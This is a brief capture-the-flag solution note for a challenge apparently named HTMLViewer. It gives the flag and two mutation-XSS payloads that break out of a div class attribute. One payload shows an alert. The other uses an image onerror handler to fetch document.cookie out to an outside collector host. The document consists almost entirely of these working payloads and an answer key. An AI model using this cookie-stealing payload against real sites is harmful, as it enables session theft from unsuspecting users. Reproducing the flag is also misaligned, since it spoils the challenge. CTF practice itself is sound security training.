# Flags

HTMLViewer flag: IRS{mut4t10n_xss_1s_ez}

# Solution

Intended sol:

<div class="|<img src=a onerror=alert(1)>|">

<div class="|<img src=a onerror=fetch(`https://collector.pythonanywhere.com/${document.cookie}`)>|">